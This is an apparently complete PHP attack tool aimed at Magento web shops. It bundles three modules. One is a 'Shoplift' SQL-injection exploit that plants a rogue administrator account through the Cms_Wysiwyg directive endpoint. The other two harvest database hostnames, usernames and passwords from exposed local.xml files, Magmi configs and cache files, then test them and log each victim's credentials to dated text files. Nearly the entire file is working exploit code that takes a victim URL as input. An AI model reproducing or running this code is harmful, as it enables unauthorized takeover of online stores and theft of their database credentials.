AVRIL
<?php
error_reporting(0);
set_time_limit(0);

// Magento Shoplift 
class Magento_Shoplift {

	private function post($url, $post = false){
		$ch = curl_init();
		curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
		curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
		curl_setopt($ch, CURLOPT_URL, $url);
		curl_setopt($ch, CURLOPT_HEADER, 0);
		curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
		curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0)");
		curl_setopt($ch, CURLOPT_RETURNTRANSFER,1);
		if($post !== false){ 
			$isi = '';
			foreach($post as $key=>$value){
				$isi .= $key.'='.$value.'&';
			}
			rtrim($isi, '&');
			curl_setopt($ch, CURLOPT_URL, $url);
			curl_setopt($ch, CURLOPT_POST, count($isi));
			curl_setopt($ch, CURLOPT_COOKIEJAR, 'cookies.txt');
			curl_setopt($ch, CURLOPT_POSTFIELDS, $isi);
		}
		$data = curl_exec($ch);
		curl_close($ch);
		return $data;
	}

	private function str($start,$end,$str){
		$a = explode($start,$str);
		$b = explode($end,$a[1]);
		return $b[0];
	}

	private function loginDownloader($username,$password,$url){
		$link = parse_url($url);
		$data = $this->post(sprintf("%s://%s/downloader/",$link["scheme"],$link["host"]), array("username" => $username, "password" => $password) );
		if(preg_match("/Log Out/i",$data) || (preg_match("/Return to Admin/i",$data))){
			if(!preg_match("/Warning: Your Magento folder does not have sufficient write permissions./i",$data)){
				return "Writeable";
			} else {
				return "Denied";
			}
		} else {
			return false;
		} 
	}

	private function loginAdmin($username,$password,$url,$key){ 
		$link = parse_url($url);
		$data = $this->post(sprintf("%s://%s/admin/",$link["scheme"],$link["host"]), array("login[username]" => $username, "login[password]" => $password, "form_key" => $key) );
		if(preg_match("/<span class=\"price\">/i",$data) || (preg_match("/class=\"link-logout\">/i",$data))){ $order = str("<span class=\"price\">","</span>",$data);
			return $order;
		} else {
			return false;
		} 
	}

	private function exploit($url,$username,$password){ 
		$email = substr(md5(time()),2,15);
		$link = parse_url($url);
		$data = $this->post(sprintf("%s://%s/admin/Cms_Wysiwyg/directive/index/",$link["scheme"],$link["host"]), array("filter" => base64_encode("popularity[from]=0&popularity[to]=3&popularity[field_expr]=0);SET @SALT = 'rp';SET @PASS = CONCAT(MD5(CONCAT( @SALT , '".$password."') ), CONCAT(':', @SALT ));SELECT @EXTRA := MAX(extra) FROM admin_user WHERE extra IS NOT NULL;INSERT INTO `admin_user` (`firstname`, `lastname`,`email`,`username`,`password`,`created`,`lognum`,`reload_acl_flag`,`is_active`,`extra`,`rp_token`,`rp_token_created_at`) VALUES ('Firstname','Lastname','{$email}@gmail.com','".$username."',@PASS,NOW(),0,0,1,@EXTRA,NULL, NOW());INSERT INTO `admin_role` (parent_id,tree_level,sort_order,role_type,user_id,role_name) VALUES (1,2,0,'U',(SELECT user_id FROM admin_user WHERE username = '".$username."'),'Firstname');"), "___directive" => base64_encode("{{block type=Adminhtml/report_search_grid output=getCsvFile}}"), "forwarded" => "1") );
		return (@imagecreatefromstring($data) !== false);
	}

	public function execute($victim,$username,$password){
		$url = parse_url($victim);
		if(!isset($url["scheme"])){
			$target = "http://".$victim;
		} else { 
			$target = $url["scheme"]."://".$url["host"];
		}
		if($this->exploit($target,$username,$password)){
			$get = $this->post(sprintf("%s://%s/admin/",$url["scheme"],$url["host"]));
			$key = $this->str("<input name=\"form_key\" type=\"hidden\" value=\"","\" />",$get);
			if($this->loginDownloader($username,$password,$target)){
				$result = "VULN | DOMAIN: ".$target." | LOGIN: ".$target."/downloader | USERNAME: ".$username." | PASSWORD: ".$password;

				echo $result;

				$file = fopen(date("d-m-y") . "-Shoplift.txt","a");
				fwrite($file, $result."\n");
				fclose($file);
			} elseif($this->loginAdmin($username,$password,$target,$key)){
				$result = "VULN | DOMAIN: ".$target." | LOGIN: ".$target."/index.php/admin | USERNAME: ".$username." | PASSWORD: ".$password;

				echo $result;

				$file = fopen(date("d-m-y") . "-Shoplift.txt","a");
				fwrite($file, $result."\n");
				fclose($file);
			} else {
				echo "FAIL | DOMAIN: ".$target;
			} 
		} else {
			echo "FAIL | DOMAIN: ".$target;
		}
	}

}

// Magento Database 
class Magento_Database {

	private function curl($url, $post = false){
		$ch = curl_init();
		curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
		curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
		curl_setopt($ch, CURLOPT_URL, $url);
		curl_setopt($ch, CURLOPT_HEADER, 0);
		curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
		curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0)");
		curl_setopt($ch, CURLOPT_RETURNTRANSFER,1);
		if($post !== false){
			$isi = '';
			foreach($post as $key=>$value){
				$isi .= $key.'='.$value.'&';
			}
			rtrim($isi, '&');
			curl_setopt($ch, CURLOPT_URL, $url);
			curl_setopt($ch, CURLOPT_POST, count($isi));
			curl_setopt($ch, CURLOPT_COOKIEJAR, 'pitek.txt');
			curl_setopt($ch, CURLOPT_POSTFIELDS, $isi);
		}
		$data = curl_exec($ch);
		curl_close($ch);
		return $data;
	}
	
	private function GetStr($start,$end,$string){
		$a = explode($start,$string);
		$b = explode($end,$a[1]);
		return $b[0];
	}
	
	private function LocalFile($target, $type){
        if($type == 1) {
        	$bug = "Local XML";
        	$location = "/app/etc/local.xml";
        } elseif($type == 2) {
        	$bug = "Magmi LFD";
        	$location = "/magmi/web/download_file.php?file=../../app/etc/local.xml";
        } elseif($type == 3) {
        	$bug = "Magmi Conf";
        	$location = "/magmi/conf/magmi.ini";
        }
		if(!empty($bug) && !empty($location)) {
			$link = parse_url($target);
			$url = sprintf("%s://%s".$location,$link["scheme"],$link["host"]);
			$victim = (!isset($link["scheme"]) ? "http://".$target : $link["scheme"]."://".$link["host"]);
			$page = $this->curl($url);
			if(preg_match('/<config>/i',$page) && !empty($this->GetStr("<username><![CDATA[","]]></username>",$page))){
				$result  = "VULN | TYPE : ".$bug." | DOMAIN : ".$url." | HOST : ".$this->GetStr("<host><![CDATA[","]]></host>",$page)." | USERNAME : ".$this->GetStr("<username><![CDATA[","]]></username>",$page)." | PASSWORD : ".$this->GetStr("<password><![CDATA[","]]></password>",$page)." | NAME : ".$this->GetStr("<dbname><![CDATA[","]]></dbname>",$page)." | INSTALED : ".$this->GetStr("<date><![CDATA[","]]></date>",$page)." | BACKEND : ".$this->GetStr("<frontName><![CDATA[","]]></frontName>",$page)." | KEY : ".$this->GetStr("<key><![CDATA[","]]></key>",$page)." | PREFIX : ".$this->GetStr("<table_prefix><![CDATA[","]]></table_prefix>",$page)." | CONNECTION : ".$this->database($this->GetStr("<host><![CDATA[","]]></host>",$page),$this->GetStr("<username><![CDATA[","]]></username>",$page),$this->GetStr("<password><![CDATA[","]]></password>",$page),$this->GetStr("<dbname><![CDATA[","]]></dbname>",$page),$link["host"]);
				
				return $result;
				
				$file = fopen(date("d-m-y") . "-Database.txt","a");
				fwrite($file, $result."\n");
				fclose($file);
			} elseif(preg_match('/[DATABASE]/i',$page) && !empty($this->GetStr("user = \"","\"",$page))){
				$result  = "VULN | TYPE : ".$bug." | DOMAIN : ".$url." | HOST : ".$this->GetStr("host = \"","\"",$page)." | USERNAME : ".$this->GetStr("user = \"","\"",$page)." | PASSWORD : ".$this->GetStr("password = \"","\"",$page)." | NAME : ".$this->GetStr("dbname = \"","\"",$page)." | PREFIX : ".$this->GetStr("table_prefix = \"","\"",$page)." | CONNECTION : ".$this->database($this->GetStr("host = \"","\"",$page),$this->GetStr("user = \"","\"",$page),$this->GetStr("password = \"","\"",$page),$this->GetStr("dbname = \"","\"",$page),$link["host"]);
				
				return $result;
				
				$file = fopen(date("d-m-y") . "-Database.txt","a");
				fwrite($file, $result."\n");
				fclose($file);
			} else {
				return "FAIL | ".$url;
			}
		}
	}

	private function database($host,$user,$pass,$name,$domain){
		if (!filter_var($host, FILTER_VALIDATE_IP) === false) {
			$ip = $host;
		} else {
			$ip = $domain;
		}

		$connect = mysql_connect($ip,$user,$pass,$name);
		if(!$connect){
			return "Failed";
		} else {
			return "Success";
			mysql_close($connect);
		}
	}
	
	public function execute($target, $type){
		echo $this->LocalFile(rtrim($target), $type);
	}
}

// Magento Cache
class curl {
	public $curl;
	public $debug = false;
	public $result;
	public $error = array();
	public $requestheader;
	public $responseheader;
	public $cookiepath;
	public $responsecookie;
	public $requestcookie;
	public $headers = array();
	public $referer;
	public $option = array();
	public $httpcode;
	public $lasturl;
	public $debugvar = array();
	public $timeout = 30;
	
	
	function __construct(){
		date_default_timezone_set("Asia/Jakarta");
		$this->curl = curl_init();
		$this->setCookiePath(md5(time()));
		$this->setUserAgent("Mozilla/5.0 (iPhone; CPU iPhone OS 8_3 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12F70 Safari/600.1.4");
		$this->setOption(CURLOPT_HEADER, true);
		$this->setOption(CURLINFO_HEADER_OUT, true);
		$this->setOption(CURLOPT_RETURNTRANSFER, true);
		$this->setOption(CURLOPT_FOLLOWLOCATION, true);
		$this->setOption(CURLOPT_TIMEOUT, $this->timeout);
		$this->setOption(CURLOPT_SSL_VERIFYPEER, false);
		$this->setOption(CURLOPT_SSL_VERIFYHOST, 2);
	}
		
	function setOption($option, $value) {
		$this->options[$option] = $value;
		return curl_setopt($this->curl, $option, $value);
	}
	
	function debug(){
		$this->debugvar['DEBUG_ERROR'] = $this->error;
		$this->debugvar['DEBUG_REQUEST_HEADERS'] = $this->requestheader;
		$this->debugvar['DEBUG_RESPONSE_HEADERS'] = $this->responseheader;
		$this->debugvar['DEBUG_LAST_URL'] = $this->lasturl;
		$this->debugvar['DEBUG_RESULT'] = $this->result;
		return $this->debugvar;
	}
	
	function setHeader($key,$value){
		$this->headers[$key] = $value;
	}
	
	function request($method,$url,$var = false){
		if(!empty($var)){
			$data = (is_array($var) ? http_build_query($var, '', '&') : $var);
			$this->setOption(CURLOPT_POSTFIELDS,$data);
		}
		if(!empty($this->headers) && is_array($this->headers)){
			$this->setRequestHeader();
		}
		$this->setMethod($method);
		$this->setOption(CURLOPT_URL,$url);
		$this->result = curl_exec($this->curl);
		$this->error['code'] = curl_errno($this->curl);
		$this->error['msg'] = curl_error($this->curl);
		$this->httpcode = curl_getinfo($this->curl, CURLINFO_HTTP_CODE);
		$this->lasturl = curl_getinfo($this->curl, CURLINFO_EFFECTIVE_URL);
		$this->requestheader = $this->parseHeader(curl_getinfo($this->curl, CURLINFO_HEADER_OUT));
		$header_size = curl_getinfo($this->curl, CURLINFO_HEADER_SIZE);
		$this->responsecookie = $this->parseCookie(substr($this->result, 0, $header_size));
		$this->responseheader = $this->parseHeader(substr($this->result, 0, $header_size));
		$this->result = substr($this->result, $header_size);
		if($this->debug == true){
			var_dump($this->debug());
		} else {
			return $this->result;
		}
		$this->unsetMethod($method);
		$this->unsetCurl();
	}
	
	function setRequestHeader(){
		$headers = array();
        foreach ($this->headers as $key => $value) {
            $headers[] = $key.': '.$value;
        }
		$this->setOption(CURLOPT_HTTPHEADER, $headers);
	}
	
	
	
	function parseHeader($response){
		if (!preg_match_all('/([A-Za-z\-]{1,})\:(.*)\\r/', $response, $matches) || !isset($matches[1], $matches[2])){
			return false;
		}
		$headers = [];
		foreach ($matches[1] as $index => $key){
			$headers[$key] = $matches[2][$index];
		}
		return $headers;
	}
	
	function setMethod($method){
		switch (strtoupper($method)){
            case 'HEAD':
				$this->setOption(CURLOPT_CUSTOMREQUEST, $method);
				$this->setOption(CURLOPT_NOBODY, true);
                break;
            case 'GET':
				$this->setOption(CURLOPT_CUSTOMREQUEST, $method);
				$this->setOption(CURLOPT_HTTPGET, true);
                break;
            case 'POST':
				$this->setOption(CURLOPT_CUSTOMREQUEST, $method);
				$this->setOption(CURLOPT_POST, true);
                break;
            default:
				$this->setOption(CURLOPT_CUSTOMREQUEST, $method);
        }
	}
	
	function unsetHeader(){
		$this->headers = array();
	}
	
	function unsetCurl(){
		curl_close($this->curl);
		$this->unsetCookie();
	}
	
	function unsetCookie(){
		if(file_exists($this->cookiepath)){
			unlink($this->cookiepath);
		}
	}
	
	function unsetMethod($method){
		$this->unsetHeader();
		$this->setOption(CURLOPT_URL, false);
		$this->setOption(CURLOPT_CUSTOMREQUEST, null);
        switch (strtoupper($method)) {
            case 'HEAD':
				$this->setOption(CURLOPT_NOBODY, false);
                break;
            case 'POST':
				$this->setOption(CURLOPT_POST, false);
				$this->setOption(CURLOPT_POSTFIELDS, false);
                break;
        }
    }
	
	function setCookiePath($name){
		$path = getcwd(). DIRECTORY_SEPARATOR . "cookie" . DIRECTORY_SEPARATOR . $name;
		$this->setOption(CURLOPT_COOKIEJAR, $path);
		$this->setOption(CURLOPT_COOKIEFILE, $path);
		$this->cookiepath = $path;
	}
	
	function setCookie($key, $value = false){
		if(is_array($key)){
			foreach($key as $set => $cookie){
				$this->requestcookie[$set] = $cookie;
			}
		} else {
			$this->requestcookie[$key] = $value;
			$this->setOption(CURLOPT_COOKIE, http_build_query($this->requestcookie, '', '; '));
		}
	}
	

	function parseCookie($header){
		
		preg_match_all('/^Set-Cookie:\s*([^;]*)/mi', $header, $matches);
		$cookies = array();
		foreach($matches[1] as $item) {
			parse_str($item, $cookie);
			$cookies = array_merge($cookies, $cookie);
		}
		return $cookies;
	}
	
	
	function setTimeout($int) {
		$this->setOption(CURLOPT_TIMEOUT, intval($int));
	}
	
	function post($url,$var = false){
		return $this->request("POST",$url,$var);
	}
	
	function get($url,$var = false){
		return $this->request("GET",$url,$var);
	}
	
	function put($url,$var = false){
		return $this->request("PUT",$url,$var);
	}
	
	function head($url,$var = false){
		return $this->request("HEAD",$url,$var);
	}
	
	function delete($url,$var = false){
		return $this->request("DELETE",$url,$var);
	}
	
	public function setUserAgent($ua){
		$this->setOption(CURLOPT_USERAGENT, $ua);
	}
	public function setReferer($referer){
		$this->setOption(CURLOPT_REFERER, $referer);
	}
	public function setSocks($socks){
		$this->setOption(CURLOPT_PROXY, $socks);
		$this->setOption(CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);
	}
	
	function getString($start,$end,$string){
		preg_match_all("/" . $start . "(.*?)" . $end . "/sm",$string,$result);
		return (isset($result[1][0]) ? $result[1][0] : false);
	}		
}

class Magento_Cache extends curl{
	private $db = array('host','username','password','dbname');
	private $tmp = array();	
	
	function __construct(){
		parent::__construct();
	}
	
	function getVar($content){
		$this->tmp['host'] = $this->getString("<host>","<\/host>",$content);
		$this->tmp['username'] = $this->getString("<username>","<\/username>",$content);
		$this->tmp['password'] = $this->getString("<password>","<\/password>",$content);
		$this->tmp['dbname'] = $this->getString("<dbname>","<\/dbname>",$content);
		return $this->tmp;
		
	}	
	
	function database($host,$user,$pass,$name,$domain){
		if (!filter_var($host, FILTER_VALIDATE_IP) === false) {
			$ip = $host;
		} else {
			$ip = $domain;
		}

		$connect = @mysqli_connect($ip,$user,$pass,$name);
		if(!$connect){
			return "Failed";
		} else {
			return "Success";
			mysqli_close($connect);
		}
	}
	
	function cache($target){
		$resource_config = $this->get($target."/var/resource_config.json");
		if(preg_match("/media_directory/i",$resource_config)){
			$parse_json = json_decode($resource_config);
			$md5 = substr(md5(str_replace('media','app/etc',$parse_json->media_directory)),0,3);
			$config_global = $this->get($target."/var/cache/mage--2/mage---".$md5."_CONFIG_GLOBAL");
			if(preg_match('/backend_forgotpassword/',$config_global)){
					$database = $this->getVar($config_global);
					$status = $this->database($database['host'],$database['username'],$database['password'],$database['dbname'],$target);
					if($status == "Success"){
						$result = "VULN | DOMAIN: ".$target." | HOST: ".$database['host']." | USERNAME: ".$database['username']." | PASSWORD: ".$database['password']." | NAME: ".$database['dbname']." | CONNECTION: Success | PATH: ".$target."/var/cache/mage--2/mage---".$md5."_CONFIG_GLOBAL";
					} else {
						$result = "VULN | DOMAIN: ".$target." | HOST: ".$database['host']." | USERNAME: ".$database['username']." | PASSWORD: ".$database['password']." | NAME: ".$database['dbname']." | CONNECTION : Failed | PATH: ".$target."/var/cache/mage--2/mage---".$md5."_CONFIG_GLOBAL";
					}

				echo $result;
				
				$file = fopen(date("d-m-y") . "-Cache.txt","a");
				fwrite($file, $result."\n");
				fclose($file);
			} else {
				echo "CONFIG_GLOBAL NOT FOUND | ".$target."/var/cache/mage--2/mage---".$md5."_CONFIG_GLOBAL";
			}
		} else {
			echo "RESOURCE_CONFIG NOT FOUND | ".$target."/var/resource_config.json";
		}
	}
	
	function execute($target){
		echo $this->cache(rtrim($target));
	}
}

$CC = $_POST['cache'];
$DB = $_POST['database'];
$TP = $_POST['type'];
$SL = $_POST['shoplift'];
$UN = $_POST['username'];
$PW = $_POST['password'];

if(isset($DB) && !empty($DB)){
	$database = new Magento_Database();
	$database->execute($DB,$TP);
} elseif(isset($SL) && !empty($SL)){
	$shoplift = new Magento_Shoplift();
	$shoplift->execute($SL,$UN,$PW);
} elseif(isset($CC) && !empty($CC)) {
	$cache = new Magento_Cache();
	$cache->execute($CC);
}
